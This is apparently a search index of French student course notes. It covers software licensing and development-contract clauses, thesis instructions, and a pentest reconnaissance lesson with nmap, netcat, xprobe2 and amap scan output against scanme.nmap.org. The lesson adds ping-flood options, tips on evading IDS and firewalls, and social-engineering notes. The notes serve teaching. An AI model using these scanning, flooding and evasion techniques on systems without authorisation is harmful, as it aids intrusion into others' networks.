Licence Le contrat par lequel l'\u00e9diteur du logiciel met \u00e0 disposition le logiciel aux utilisateurs contre paiement d'une redevance. Ex : Office 365 Licence libre Par d\u00e9finition le texte de la licence est \"libre\" : Une dur\u00e9e, un nombre d'utilisateur, une zone g\u00e9ographique Y compris l'exclusivit\u00e9 L'exploitation des logiciels se fait par le biais de licences Le contenu de la licence est libre, seuls certains points sont impos\u00e9s par la loi : la licence ne peut pas introduire la copie priv\u00e9e / sauvegarde La loi autorise de modifier / adapter le logiciel afin qu'il soit conforme \u00e0 son utilisation. Que faire en cas de non respect du droit d'auteur ? Situation dans laqeuelle l'auteur (\u00e9diteur) d'un logiciel d\u00e9couvre une utilisation non autoris\u00e9e de son logiciel => Dans ce cas il doit saisir les tribunaux afin de faire cesser l'utilisation non autoris\u00e9e (logiciels craqu\u00e9) => demande d'astreinte. Vous cr\u00e9er un logiciel, une personne r\u00e9cup\u00e8re de mani\u00e8re froduleuse le code source et utilise le logiciel en son nom. => action en contrefa\u00e7on, il faudra d\u00e9montrer \u00eatr le premier \u00e0 l'avoir cr\u00e9\u00e9. (mail, code etc). Exemple de contrat de developpement sp\u00e9cifique de logiciel 1) identification des partis - prestataire : adresse, nom de l'entreprise, repr\u00e9sentant l\u00e9gal, num\u00e9ro RCS, nom du signataire. 1ere question : si exclusivit\u00e9 du logiciel, client sp\u00e9cifique ou client + filliales 3) Le prix ? PLusieurs param\u00e8tres rentrent en ligne de compte dans le calcul du prix : * le scode of work => le prix doit \u00eatre conforme \u00e0 ce qui est \"r\u00e9ellement vendu\" * L'exclusivit\u00e9 ou non sur le logiciel => prix plus \u00e9lev\u00e9 si exclusivit\u00e9 * les prestataires anexes (formation, mise \u00e0 jour, etc) Sur la prestation intelectuelle, ce qui compte tarif (homme/jour) + prix \u00e9quipement","title":"protection de logiciel"},{"location":"management/proteger_le_travail/#forfaitaire","text":"Forfait 150000\u20ac HT developpement + installation ERP s\u00e9curis\u00e9 Si d\u00e9pense 180000\u20ac, c'est 30000\u20ac de perte. Si d\u00e9pense 90000\u20ac, gain 60000\u20ac","title":"forfaitaire"},{"location":"management/proteger_le_travail/#regie","text":"On communique au client les prix : - technicien : 400\u20ac - ing\u00e9 : 650\u20ac - chef projet : 800\u20ac budget \u00e9quipement 20% => Budget estimatif. L'enterprise revient r\u00e9guli\u00e8rement vers le clients avec l'\u00e9volution du prix. L'avantage pour le client du prix en r\u00e9gie c'est qu'il est s\u00fbr de payer exactement ce que \u00e7a co\u00fbte. Ne paiera pas plus que ce que \u00e7a vaut. Les modalit\u00e9s de paiements C'est libre Exemple : 30% \u00e0 la signature 40% recette provisoir 30% recette finale L'objectif \u00e9tant d'\u00eatre en tr\u00e9sorerie positive. 4) Modalit\u00e9s de facturation L'inter\u00eat est de facturer et d'\u00eatre pay\u00e9 rapidement. L'id\u00e9al est d'\u00eatre pay\u00e9 par le client avant de payer le fournisseur. Vente d'un serveur : (10000\u20ac prix client => 30 jours / 7000\u20ac prix fournisseur => 60 jours) => T.P = 3000\u20ac 2eme perte : les stocks ont un co\u00fbt, limiter au maximum les stocks. => close de r\u00e9serve de propri\u00e9t\u00e9. A default de paiement de l'int\u00e9gralit\u00e9 du prix, les \u00e9quipements seront retir\u00e9s au vendeur \u00e0 la charge du client. Un objet lou\u00e9 ne pourra pas \u00eatre saisi, n'appartient pas \u00e0 la personne mais \u00e0 l'entreprise qui loue. clause \" Les partis sont convenues que le transfert de propri\u00e9t\u00e9 des \"biens\" vendus est dif\u00e9r\u00e9 jusqu'au complet paiement de la somme correspondant au dit \u00e9quipement\". - 1er avantage : En cas de non paiement, les \u00e9quipements peuvent \u00eatre r\u00e9cup\u00e9r\u00e9s. - 2eme avantage : En cas de liquideation judiciaire du client, les biens non pay\u00e9s appartiennent encore au vendeur. 5) Travaux additionnels Cette close pr\u00e9voit que le client peut demander des T.S, en tous les cas cela doit faire l'objet d'un avenant au contrat. - Article 2 D\u00e9finition des prestataires : les prestations sont modifi\u00e9s telles que d\u00e9crites dans la V2 du cahier des charges. - Article 3 : Le prix est modifi\u00e9 comme suit - Article X : Le d\u00e9lai de livraison est \u00e9tendu de X jours Le montant des travaux suppl\u00e9mentaires (T.S) sera calcul\u00e9 sur la base suivante : => 500\u20ac/jour/technicien => 750\u20ac/jour/ing\u00e9 => prix des \u00e9quipements +20% 6) D\u00e9lais d'execution Toujours le calculer en semaine ou mois mais pas de date de fin, et pr\u00e9voir les conditions de d\u00e9but des prestations (pr\u00e9-requis client). electricit\u00e9 acc\u00e8s connexion arr\u00eat de production => Le d\u00e9lai de commence \u00e0 courrir que lorsque toutes les conditions sont remplies. Tout retard imputable au client et/ou aux autres entreprises interantes sur site donne droit \u00e0 une extension de d\u00e9lai (\u00e9quivalente) au retard + un d\u00e9lai raisonnable n\u00e9cessaire pour la r\u00e9flexion du personnel du prestataire. \"Tout retard imputable au prestataire donnera droit au client \u00e0 un paiement de 1% du montant du contrat par semaine de retard\" Je dois d\u00e9velopper un logiciel qui fait fonctionner une ligne de prod (1M\u20ac/jour). =>Je vends mon logiciel : 100.000\u20ac 5 mois => livraison 6 mois : 4000\u20ac p\u00e9nalit\u00e9 de retard En droit des contrats : Les p\u00e9nalit\u00e9s de retard (liquidated et domages) sont forfaitaire et lib\u00e9ratoire, ce qui signifie que le client ne peut pas demander plus de d\u00e9dommagement au titre des retards. En cas de retard le prestataire n'a rien \u00e0 payer en plus que le montant des p\u00e9nalit\u00e9s. 7) Collaboration du client => le prestataire peut lister des pr\u00e9requis Le client est tenu de collaborer avec le prestataire : - Lui fournir l'ensemble des informations n\u00e9cessaires \u00e0 la bonne r\u00e9alisation du projet. - Lui indiquer des \u00e9ventuelles difficult\u00e9s li\u00e9s \u00e0 la r\u00e9alisation des prestataires. - Valider le cahier des charges. - Participer aux r\u00e9unions, etc 8) Tests Important : Tester le fonctionnement de ce que vous faites => la recette (le recetage) Qui \u00e9tablit les tests : les clients ? le prestataire ? => le calendrier + les tests \u00e0 proprement parl\u00e9. L'id\u00e9al \u00e9tant de tester r\u00e9guli\u00e8rement les \u00e9valuations du d\u00e9veloppement du logiciel. 9) la recette Pr\u00e9voir un d\u00e9lai maximum de r\u00e9ponse du client en pr\u00e9cisant que pass\u00e9 ce d\u00e9lai la recette est sens\u00e9e avoir \u00e9t\u00e9 faite. \" A defaut de r\u00e9ponse du client sous 8 jours \u00e0 la demande de recette du prestataire, la recette est r\u00e9put\u00e9e avoir \u00e9t\u00e9 r\u00e9alis\u00e9e.\" La garantie A dater de la recette, le prestataire s'engage \u00e0 corriger les anomalies \u00e9ventuelles pendant une p\u00e9riode de X mois (\u00e0 n\u00e9gocier). Plafonner \u00e0 un co\u00fbt, droit \u00e0 X\u20ac de r\u00e9parations.","title":"R\u00e9gie"},{"location":"memoire_entreprise/instruction_memoire_entreprise/","text":"/!\\ ALL IN ENGLISH /!\\ Pr\u00e9senter l'entreprise et les diff\u00e9rents serivces Votre r\u00f4le dans le service (sans rentrer dans les d\u00e9tails mais liste exaustive des missions) pr\u00e9senter le chiffre d'affaire, les budgets qui sont les clients ? Comment l'entreprise gagne des sous qui est dans le service, les managers, la hierarchie Remercier entreprise MA manager et differents membres de l'\u00e9quipe, CFA, ITECIA Lister toues vos actions/misisons/t\u00e2ches quotidiennes => choisir les missions \u00e0 d\u00e9velopper (Environ 3 situations) (si pleins de petites choses, peut en faire plus) * entretient annuel * indicateur de qualit\u00e9 (si existant) Situation date d\u00e9but/fin objectif / probl\u00e8mes r\u00e9gler Impact D\u00e9finir le cadre (tensions, probl\u00e8mes internes \u00e0 l'\u00e9quipe, humain) Avis critique sur l'\u00e9volution, forces et faiblesses methode SWAT (strengh / weakness/ ....) Montrer une \u00e9volution Montrer que l'on est pr\u00eat \u00e0 \u00eatre cadre d\u00e9butant","title":"Instruction memoire entreprise"},{"location":"memoire_entreprise/instruction_memoire_entreprise/#presenter-lentreprise-et-les-differents-serivces","text":"Votre r\u00f4le dans le service (sans rentrer dans les d\u00e9tails mais liste exaustive des missions) pr\u00e9senter le chiffre d'affaire, les budgets qui sont les clients ? Comment l'entreprise gagne des sous qui est dans le service, les managers, la hierarchie","title":"Pr\u00e9senter l'entreprise et les diff\u00e9rents serivces"},{"location":"memoire_entreprise/instruction_memoire_entreprise/#remercier","text":"entreprise MA manager et differents membres de l'\u00e9quipe, CFA, ITECIA","title":"Remercier"},{"location":"memoire_entreprise/instruction_memoire_entreprise/#lister-toues-vos-actionsmisisonstaches-quotidiennes","text":"=> choisir les missions \u00e0 d\u00e9velopper (Environ 3 situations) (si pleins de petites choses, peut en faire plus) * entretient annuel * indicateur de qualit\u00e9 (si existant)","title":"Lister toues vos actions/misisons/t\u00e2ches quotidiennes"},{"location":"memoire_entreprise/instruction_memoire_entreprise/#situation","text":"date d\u00e9but/fin objectif / probl\u00e8mes r\u00e9gler Impact D\u00e9finir le cadre (tensions, probl\u00e8mes internes \u00e0 l'\u00e9quipe, humain)","title":"Situation"},{"location":"memoire_entreprise/instruction_memoire_entreprise/#avis-critique-sur-levolution-forces-et-faiblesses","text":"methode SWAT (strengh / weakness/ ....) Montrer une \u00e9volution Montrer que l'on est pr\u00eat \u00e0 \u00eatre cadre d\u00e9butant","title":"Avis critique sur l'\u00e9volution, forces et faiblesses"},{"location":"methodologie_pentest/cours/","text":"Enum\u00e9ration passive Network mapping Finger printing des ports ouverts Quels sont les ports TCP et UDP ouverts ? et les services qui tournent derii\u00e8re Envois un echo request sur l'adresse IP => savoir si il a un h\u00f4te nmap -sn scanme.nmap.org Quels servicent sont sur ce site ? nmap -sS scanme.nmap.org Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 07:26 EDT Nmap scan report for scanme.nmap.org (45.33.32.156) Host is up (0.35s latency). Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f Not shown: 992 closed ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http 443/tcp open https 554/tcp open rtsp 1723/tcp open pptp 9929/tcp open nping-echo 31337/tcp open Elite C'est la m\u00e9thode la plus s\u00fbre pour ne pas se faire toper par un IDS Envois juste un SYN et voit si \u00e7a r\u00e9pond -sS => stelf scan STATE : filtered => proxy qui va passer la connexion au serveur seulement si la connexion est \u00e9tablie (SYN, SYN ACK, ACK). Par d\u00e9faut les serveurs linux ne log que les connexions \u00e9tablies ! -sS n'envoit pas le dernier ACK Scan TCP sudo nmap -sT scanme.nmap.org Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 07:42 EDT Nmap scan report for scanme.nmap.org (45.33.32.156) Host is up (0.19s latency). Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f Not shown: 992 closed ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http 443/tcp open https 554/tcp open rtsp 1723/tcp open pptp 9929/tcp open nping-echo 31337/tcp open Elite sudo nmap -sU scanme.nmap.org Le scan de port UDP est beaucoup plus long, nmap va tester plusieurs commandes par port pour voir si \u00e7a r\u00e9pond, va chercker la commande DNS sur le port 53, si \u00e7a rep pas il va tester les commandes de tous les ports les plus connus. ==> super voyant ! Pour aller plus vite on peut jouer ave l'option -T Timer agressive => r\u00e9duit le temps des timers, le risque si trop \u00e9lev\u00e9 et que le serveur soit trop bourr\u00e9 pour r\u00e9pondre \u00e0 temps. Fingerprinting des services nc -vv scanme.nmap.org 80 -vv => Verbose scanme.nmap.org [45.33.32.156] 80 (http) open d HTTP/1.1 400 Bad Request Date: Thu, 15 Oct 2020 12:05:12 GMT Server: Apache/2.4.7 (Ubuntu) Content-Length: 306 Connection: close Content-Type: text/html; charset=iso-8859-1 <!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> <html><head> <title>400 Bad Request</title> </head><body> <h1>Bad Request</h1> <p>Your browser sent a request that this server could not understand.<br /> </p> <hr> <address>Apache/2.4.7 (Ubuntu) Server at scanme.nmap.org Port 80</address> </body></html> sent 2, rcvd 487 => Beaucoup plus discret un NC qu'nmap sudo nmap -sV -p 80 scanme.nmap.org Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 08:11 EDT Nmap scan report for scanme.nmap.org (45.33.32.156) Host is up (0.0049s latency). Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.54 seconds sudo nmap -sV -p 31337 scanme.nmap.org Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 08:08 EDT Nmap scan report for scanme.nmap.org (45.33.32.156) Host is up (0.050s latency). Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f PORT STATE SERVICE VERSION 31337/tcp open tcpwrapped Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 2.64 seconds => tcp redirig\u00e9 vers un autre port de la machine, pas r\u00e9ussis \u00e0 trouver le service sudo nmap -sV scanme.nmap.org Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 08:15 EDT Nmap scan report for scanme.nmap.org (45.33.32.156) Host is up (0.19s latency). Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f Not shown: 992 closed ports PORT STATE SERVICE VERSION 21/tcp open tcpwrapped 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) 443/tcp open tcpwrapped 554/tcp open rtsp? 1723/tcp open tcpwrapped 9929/tcp open nping-echo Nping echo 31337/tcp open tcpwrapped Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 116.27 seconds Fingerprinting de l'OS sudo nmap -O scanme.nmap.org 21/tcp open ftp 22/tcp open ssh 80/tcp open http 443/tcp open https 554/tcp open rtsp 1723/tcp open pptp 9929/tcp open nping-echo 31337/tcp open Elite Aggressive OS guesses: Actiontec MI424WR-GEN3I WAP (93%), DD-WRT v24-sp2 (Linux 2.4.37) (92%), Linux 3.2 (91%), Linux 4.4 (90%), Microsoft Windows XP SP3 (90%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (90%), BlueArc Titan 2100 NAS device (90%), FireBrick FB2700 firewall (87%), IBM BladeCenter management module, IBM System Storage TS3100/TS3200 Express Model tape library, or HP StorageWorks MSL2024 tape library (87%), Pirelli DP-10 VoIP phone (87%) No exact OS matches for host (test conditions non-ideal). Network Distance: 26 hops LINUX , nmap se base sur le payload des r\u00e9ponses pour d\u00e9terminer l'OS, la longueur, le temps de r\u00e9ponse, le contenu varies d'un OS \u00e0 un autre. 26 sauts traceroute scanme.nmap.org traceroute to 45.33.32.156 (45.33.32.156), 30 hops max, 60 byte packets 1 172.16.66.2 (172.16.66.2) 0.389 ms 0.239 ms 0.439 ms 2 _gateway (192.168.43.1) 5.278 ms 5.074 ms 4.940 ms 3 10.125.160.5 (10.125.160.5) 23.847 ms 26.652 ms 32.521 ms 4 10.125.161.82 (10.125.161.82) 32.444 ms 32.283 ms 32.993 ms 5 10.162.36.50 (10.162.36.50) 32.804 ms 32.634 ms 32.468 ms 6 89.89.101.10 (89.89.101.10) 32.302 ms 34.489 ms 37.574 ms 7 62.34.2.30 (62.34.2.30) 37.416 ms 30.329 ms 30.235 ms 8 62.34.2.60 (62.34.2.60) 31.569 ms 35.021 ms 34.954 ms 9 212.194.170.253 (212.194.170.253) 45.222 ms 45.377 ms 45.090 ms 10 be4887.agr21.mrs01.atlas.cogentco.com (149.14.126.217) 56.194 ms 56.134 ms 56.074 ms 11 be2346.ccr22.mrs01.atlas.cogentco.com (154.54.38.173) 56.730 ms 55.947 ms 39.609 ms 12 be3092.ccr41.par01.atlas.cogentco.com (130.117.49.153) 42.653 ms be3093.ccr42.par01.atlas.cogentco.com (130.117.50.165) 42.448 ms be3092.ccr41.par01.atlas.cogentco.com (130.117.49.153) 39.135 ms 13 be12489.ccr42.lon13.atlas.cogentco.com (154.54.57.69) 48.364 ms be12497.ccr41.lon13.atlas.cogentco.com (154.54.56.129) 53.034 ms 53.193 ms 14 be2099.ccr31.bos01.atlas.cogentco.com (154.54.82.34) 116.338 ms be2101.ccr32.bos01.atlas.cogentco.com (154.54.82.38) 116.285 ms 116.226 ms 15 be3600.ccr22.alb02.atlas.cogentco.com (154.54.0.221) 118.722 ms 118.305 ms 118.567 ms 16 be2878.ccr21.cle04.atlas.cogentco.com (154.54.26.129) 129.611 ms 129.612 ms 129.562 ms 17 be2718.ccr42.ord01.atlas.cogentco.com (154.54.7.129) 186.580 ms 186.470 ms 186.410 ms 18 be2831.ccr21.mci01.atlas.cogentco.com (154.54.42.165) 152.033 ms 156.927 ms be2832.ccr22.mci01.atlas.cogentco.com (154.54.44.169) 156.765 ms 19 be3035.ccr21.den01.atlas.cogentco.com (154.54.5.89) 180.882 ms be3036.ccr22.den01.atlas.cogentco.com (154.54.31.89) 151.750 ms be3035.ccr21.den01.atlas.cogentco.com (154.54.5.89) 161.721 ms 20 be3038.ccr32.slc01.atlas.cogentco.com (154.54.42.97) 168.204 ms 172.076 ms 171.969 ms 21 be3110.ccr22.sfo01.atlas.cogentco.com (154.54.44.141) 189.691 ms be3109.ccr21.sfo01.atlas.cogentco.com (154.54.44.137) 185.893 ms be3110.ccr22.sfo01.atlas.cogentco.com (154.54.44.141) 189.248 ms 22 be3178.ccr21.sjc01.atlas.cogentco.com (154.54.43.70) 189.099 ms 179.455 ms 184.264 ms 23 be2063.rcr21.b001848-1.sjc01.atlas.cogentco.com (154.54.1.162) 183.170 ms be2095.rcr21.b001848-1.sjc01.atlas.cogentco.com (154.54.3.138) 187.045 ms 186.965 ms 24 38.142.11.154 (38.142.11.154) 188.374 ms 186.812 ms 178.271 ms 25 173.230.159.65 (173.230.159.65) 189.209 ms 189.095 ms 192.352 ms 26 scanme.nmap.org (45.33.32.156) 188.726 ms 176.661 ms 182.252 ms Il est possible d'avoir des * * \u00e0 la place, c'est normal => on rentre dans des routeurs priv\u00e9s avec des ACL. xprobe xprobe2 scanme.nmap.org sudo xprobe2 scanme.nmap.org Xprobe2 v.0.3 Copyright (c) 2002-2005 fyodor@o0o.nu, ofir@sys-security.com, meder@o0o.nu [+] Target is scanme.nmap.org [+] Loading modules. [+] Following modules are loaded: [x] [1] ping:icmp_ping - ICMP echo discovery module [x] [2] ping:tcp_ping - TCP-based ping discovery module [x] [3] ping:udp_ping - UDP-based ping discovery module [x] [4] infogather:ttl_calc - TCP and UDP based TTL distance calculation [x] [5] infogather:portscan - TCP and UDP PortScanner [x] [6] fingerprint:icmp_echo - ICMP Echo request fingerprinting module [x] [7] fingerprint:icmp_tstamp - ICMP Timestamp request fingerprinting module [x] [8] fingerprint:icmp_amask - ICMP Address mask request fingerprinting module [x] [9] fingerprint:icmp_port_unreach - ICMP port unreachable fingerprinting module [x] [10] fingerprint:tcp_hshake - TCP Handshake fingerprinting module [x] [11] fingerprint:tcp_rst - TCP RST fingerprinting module [x] [12] fingerprint:smb - SMB fingerprinting module [x] [13] fingerprint:snmp - SNMPv2c fingerprinting module [+] 13 modules registered [+] Initializing scan engine [+] Running scan engine [-] ping:tcp_ping module: no closed/open TCP ports known on 45.33.32.156. Module test failed [-] ping:udp_ping module: no closed/open UDP ports known on 45.33.32.156. Module test failed [-] No distance calculation. 45.33.32.156 appears to be dead or no ports known [+] Host: 45.33.32.156 is up (Guess probability: 50%) [+] Target: 45.33.32.156 is alive. Round-Trip Time: 0.50697 sec [+] Selected safe Round-Trip Time value is: 1.01394 sec [-] fingerprint:tcp_hshake Module execution aborted (no open TCP ports known) [-] fingerprint:smb need either TCP port 139 or 445 to run [-] fingerprint:snmp: need UDP port 161 open [+] Primary guess: [+] Host 45.33.32.156 Running OS: \ufffdz\ufffd\ufffdV (Guess probability: 89%) [+] Other guesses: [+] Host 45.33.32.156 Running OS: \ufffdz\ufffd\ufffdV (Guess probability: 89%) [+] Host 45.33.32.156 Running OS: \ufffdz\ufffd\ufffdV (Guess probability: 89%) [+] Host 45.33.32.156 Running OS: \ufffdz\ufffd\ufffdV (Guess probability: 89%) [+] Host 45.33.32.156 Running OS: (Guess probability: 89%) [+] Host 45.33.32.156 Running OS: \ufffd\ufffd\ufffd\ufffdV (Guess probability: 89%) [+] Host 45.33.32.156 Running OS: \ufffdz\ufffd\ufffdV (Guess probability: 89%) [+] Host 45.33.32.156 Running OS: \ufffdz\ufffd\ufffdV (Guess probability: 89%) [+] Host 45.33.32.156 Running OS: (Guess probability: 89%) [+] Host 45.33.32.156 Running OS: \ufffd\ufffd\ufffd\ufffdV (Guess probability: 89%) [+] Cleaning up scan engine [+] Modules deinitialized [+] Execution completed. Pourquoi il ne faut jamais utiliser nmap dans une grosse structure ? sudo nmap --packet-trace -p 80 -sT scanme.nmap.org Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 09:22 EDT SENT (0.0790s) ICMP [172.16.66.131 > 45.33.32.156 Echo request (type=8/code=0) id=40162 seq=0] IP [ttl=42 id=29061 iplen=28 ] SENT (0.0791s) TCP 172.16.66.131:47724 > 45.33.32.156:443 S ttl=41 id=33834 iplen=44 seq=821924815 win=1024 <mss 1460> SENT (0.0792s) TCP 172.16.66.131:47724 > 45.33.32.156:80 A ttl=41 id=57855 iplen=40 seq=0 win=1024 SENT (0.0793s) ICMP [172.16.66.131 > 45.33.32.156 Timestamp request (type=13/code=0) id=27588 seq=0 orig=0 recv=0 trans=0] IP [ttl=49 id=54644 iplen=40 ] RCVD (0.0793s) TCP 45.33.32.156:80 > 172.16.66.131:47724 R ttl=128 id=8773 iplen=40 seq=821924815 win=32767 NSOCK INFO [0.1220s] nsock_iod_new2(): nsock_iod_new (IOD #1) NSOCK INFO [0.1220s] nsock_connect_udp(): UDP connection requested to 172.16.66.2:53 (IOD #1) EID 8 NSOCK INFO [0.1230s] nsock_read(): Read request from IOD #1 [172.16.66.2:53] (timeout: -1ms) EID 18 NSOCK INFO [0.1230s] nsock_write(): Write request for 43 bytes to IOD #1 EID 27 [172.16.66.2:53] NSOCK INFO [0.1230s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8 [172.16.66.2:53] NSOCK INFO [0.1230s] nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 27 [172.16.66.2:53] NSOCK INFO [0.1250s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 18 [172.16.66.2:53] (72 bytes): .............156.32.33.45.in-addr.arpa..................scanme.nmap.org. NSOCK INFO [0.1250s] nsock_read(): Read request from IOD #1 [172.16.66.2:53] (timeout: -1ms) EID 34 NSOCK INFO [0.1250s] nsock_iod_delete(): nsock_iod_delete (IOD #1) NSOCK INFO [0.1250s] nevent_delete(): nevent_delete on event #34 (type READ) CONN (0.1261s) TCP localhost > 45.33.32.156:80 => Operation now in progress CONN (0.1572s) TCP localhost > 45.33.32.156:80 => Connected Nmap scan report for scanme.nmap.org (45.33.32.156) Host is up (0.0041s latency). Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f PORT STATE SERVICE 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds On voit 4 contr\u00f4les pour voir si l'h\u00f4te est en vie: ping SYN ACK (envois un SYN et un ACK directement sans attendre le SYNACK. Les deux avec des num\u00e9ros de s\u00e9quences al\u00e9atoires Le serveur r\u00e9pond par un RA (reset ack) timestamp request => c'est l'empreinte de nmap ! Conclusion Quand on utilise nmap il y a une empreinte, tous les par feu (actifs, \u00e0 jour, g\u00e9r\u00e9) le savent et vont gueuller. => Il faut suprimer l'empreinte depuis le code source et le recompiler. NMAP est un outil puissant mais facile \u00e0 d\u00e9tecter Autres outils Amap Amap est un concurent de nmap mais sans empreinte, seulement il est moins puissant. amap scanme.nmap.org 80 amap v5.4 (www.thc.org/thc-amap) started at 2020-10-15 09:35:35 - APPLICATION MAPPING mode Protocol on 45.33.32.156:80/tcp matches http Protocol on 45.33.32.156:80/tcp matches http-apache-2 Unidentified ports: none. amap v5.4 finished at 2020-10-15 09:35:41 amap scanme.nmap.org 31337 amap v5.4 (www.thc.org/thc-amap) started at 2020-10-15 09:37:26 - APPLICATION MAPPING mode Unidentified ports: 45.33.32.156:31337/tcp (total 1). amap v5.4 finished at 2020-10-15 09:37:33 amap scanme.nmap.org 29 amap v5.4 (www.thc.org/thc-amap) started at 2020-10-15 09:37:26 - APPLICATION MAPPING mode Unidentified ports: 45.33.32.156:31337/tcp (total 1). amap v5.4 finished at 2020-10-15 09:37:33 Peut renvoyer les donn\u00e9es en hexa si il identifie pas ping ping 8.8.8.8 Envoyer x ping ping -c 6 8.8.8.8 Taille octet d'un ping ping -s 2000 8.8.8.8 flood => envoyer autant de ping que la carte et le reseau peut ping -f 2000 8.8.8.8 Ne pas faire dans un r\u00e9seau surveiller mais dans un pourrie sur un serveur, permet de savoir il est facilement dans les choux, sature vite. intervale en seconde ping -i 15 8.8.8.8 burst : envoie XX pings \u00e0 balle puis ping normal ping -l 50 8.8.8.8 => permet de bypass les par feu tout en sachant si un serveur est pourrie, le par feu va s'en foutre de 30 ping rapide tcptraceroute sudo tcptraceroute 8.8.8.8 Active information gathering - via l'\u00eatre humain sociel-engineer.org manuel de l'arm\u00e9e : FM2-223 - Alertness => \u00eatre \u00e0 l'alert de chaque d\u00e9tails (plissage de front => defensive) etc - Patience / tact - credibilit\u00e9 - Objectivit\u00e9 - Adaptabilit\u00e9 - Pers\u00e9v\u00e9rences Elements Terre => etat \u00e9motionnel stable : difficile \u00e0 \u00e9nerver / aime pas le changement / paresse Eau => Changement rapide \u00e9tat emmotionnel : Difficile \u00e0 cerner et contr\u00f4ler / facilement en col\u00e8re Feu => Contr\u00f4le \u00e9motionnel : cagressif, dominant / ego, puissance => faut faire peur pour dominer Vent => Intelligence emmotionelle : ampathie, sensible / b\u00e9n\u00e9volat / aime aider / manifeste geste amour => sympathique N\u00e9ant => Cr\u00e9activit\u00e9 / diriger son \u00e9nergie \u00e0 r\u00e9veler l'\u00e9l\u00e9ment des autres => vanit\u00e9, ego classer dans les cat\u00e9gories : 1) vous camarade ? 2) vous profs ? 3) Vous ?","title":"Enum\u00e9ration passive"},{"location":"methodologie_pentest/cours/#enumeration-passive","text":"","title":"Enum\u00e9ration passive"},{"location":"methodologie_pentest/cours/#network-mapping","text":"","title":"Network mapping"},{"location":"methodologie_pentest/cours/#finger-printing-des-ports-ouverts","text":"Quels sont les ports TCP et UDP ouverts ? et les services qui tournent derii\u00e8re Envois un echo request sur l'adresse IP => savoir si il a un h\u00f4te nmap -sn scanme.nmap.org Quels servicent sont sur ce site ? nmap -sS scanme.nmap.org Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 07:26 EDT Nmap scan report for scanme.nmap.org (45.33.32.156) Host is up (0.35s latency). Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f Not shown: 992 closed ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http 443/tcp open https 554/tcp open rtsp 1723/tcp open pptp 9929/tcp open nping-echo 31337/tcp open Elite C'est la m\u00e9thode la plus s\u00fbre pour ne pas se faire toper par un IDS Envois juste un SYN et voit si \u00e7a r\u00e9pond -sS => stelf scan STATE : filtered => proxy qui va passer la connexion au serveur seulement si la connexion est \u00e9tablie (SYN, SYN ACK, ACK). Par d\u00e9faut les serveurs linux ne log que les connexions \u00e9tablies ! -sS n'envoit pas le dernier ACK Scan TCP sudo nmap -sT scanme.nmap.org Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 07:42 EDT Nmap scan report for scanme.nmap.org (45.33.32.156) Host is up (0.19s latency). Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f Not shown: 992 closed ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http 443/tcp open https 554/tcp open rtsp 1723/tcp open pptp 9929/tcp open nping-echo 31337/tcp open Elite sudo nmap -sU scanme.nmap.org Le scan de port UDP est beaucoup plus long, nmap va tester plusieurs commandes par port pour voir si \u00e7a r\u00e9pond, va chercker la commande DNS sur le port 53, si \u00e7a rep pas il va tester les commandes de tous les ports les plus connus. ==> super voyant ! Pour aller plus vite on peut jouer ave l'option -T Timer agressive => r\u00e9duit le temps des timers, le risque si trop \u00e9lev\u00e9 et que le serveur soit trop bourr\u00e9 pour r\u00e9pondre \u00e0 temps.","title":"Finger printing des ports ouverts"},{"location":"methodologie_pentest/cours/#fingerprinting-des-services","text":"nc -vv scanme.nmap.org 80 -vv => Verbose scanme.nmap.org [45.33.32.156] 80 (http) open d HTTP/1.1 400 Bad Request Date: Thu, 15 Oct 2020 12:05:12 GMT Server: Apache/2.4.7 (Ubuntu) Content-Length: 306 Connection: close Content-Type: text/html; charset=iso-8859-1 <!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> <html><head> <title>400 Bad Request</title> </head><body> <h1>Bad Request</h1> <p>Your browser sent a request that this server could not understand.<br /> </p> <hr> <address>Apache/2.4.7 (Ubuntu) Server at scanme.nmap.org Port 80</address> </body></html> sent 2, rcvd 487 => Beaucoup plus discret un NC qu'nmap sudo nmap -sV -p 80 scanme.nmap.org Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 08:11 EDT Nmap scan report for scanme.nmap.org (45.33.32.156) Host is up (0.0049s latency). Other addresses for 